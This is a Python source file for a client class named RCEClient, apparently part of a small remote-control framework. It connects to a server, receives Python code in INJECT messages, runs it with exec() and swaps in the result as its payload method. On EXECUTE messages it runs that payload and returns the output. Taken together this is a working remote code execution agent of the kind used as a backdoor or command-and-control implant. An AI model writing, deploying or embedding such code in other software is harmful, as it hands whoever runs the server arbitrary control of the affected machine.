import sys

from src.core.base_client import BaseClientThread
from src.core.logger import Logger
from src.core.message import MessageType, Message


class RCEClient(BaseClientThread):
    """
    A client thread that connects to a remote server and performs actions based on incoming messages from the server.
    """

    def __init__(self, host='localhost', port=6000, debug=False):
        super().__init__()
        self.__logger = Logger(self.__class__.__name__, debug)
        try:
            self.connect_to_server(host, port)
            self.__logger.info(f"Connected to {host}:{port}")
        except ConnectionRefusedError as e:
            self.__logger.error(f"Failed to connect to {host}:{port}")
            self.__logger.debug(f"[REASON] {e}")
            exit(1)

    def run(self):
        """
        Runs the client thread which handles incoming messages from the server and performs actions based on the
        message type.
        """
        self.__logger.info("Listening for messages...")
        while self.is_connected():
            try:
                message = self.receive_message()
                if message.is_type(MessageType.DISCONNECT):
                    raise OSError("RECEIVED DISCONNECT")

                if message.is_type(MessageType.ECHO):
                    self.__logger.debug(f"Received echo from {message.get_sender()}:\n\t{message}")
                    self.__logger.info(message.data.decode())
                    self.send_message(message)
                elif message.is_type(MessageType.FILE):
                    self.__logger.debug(f"Received file from {message.get_sender()}:\n\t{message}")
                elif message.is_type(MessageType.INJECT):
                    self.__logger.debug(f"Received inject from {message.get_sender()}:\n\t{message}")
                    self.inject_payload(message)
                elif message.is_type(MessageType.EXECUTE):
                    self.__logger.debug(f"Received execute from {message.get_sender()}:\n\t{message}")
                    self.execute_payload()
                elif message.is_type(MessageType.ERROR):
                    self.__logger.debug(f"Received error from {message.get_sender()}:\n\t{message}")
                else:
                    self.__logger.debug(f"Unknown message type from {message.get_sender()}: {message.get_type()}")
            except OSError as e:
                self.close()
                self.__logger.error("DISCONNECTED from server")
                self.__logger.debug(f"[REASON] {e}")
                break

    # noinspection PyMethodMayBeStatic
    def payload(self):
        """
        This is where the payload is defined and will be dynamically injected and executed by the server.
        """
        return "No payload has been injected"

    def inject_payload(self, message: Message):
        """
        Injects the payload from the received message.

        The payload is:
          - Decoded from the message data.
          - Executed using the built-in exec() function with local and global scope.
          - Assigned as an attribute of the RCEClient class.

        :param message: The message containing the payload to be injected.
        """
        received_payload = message.data.decode()
        self.__logger.debug("Injecting payload:\n" + received_payload)
        exec(received_payload, locals(), globals())
        setattr(RCEClient, "payload", getattr(sys.modules[__name__], "payload"))
        self.__logger.debug("Injected payload")
        self.send_message(Message(message_type=MessageType.ECHO, data=b"Payload injected"))

    def execute_payload(self):
        """
        Executes the payload and sends its output back to the server.
        """
        if output := self.payload():
            output = str(output)
            output_bytes = bytes(output, 'utf-8')
            self.__logger.debug(f"Output from payload execution:\n{output}")

            try:
                message = Message(message_type=MessageType.ECHO, data=output_bytes)
                self.send_message(message)
            except OSError as e:
                self.__logger.error(e)
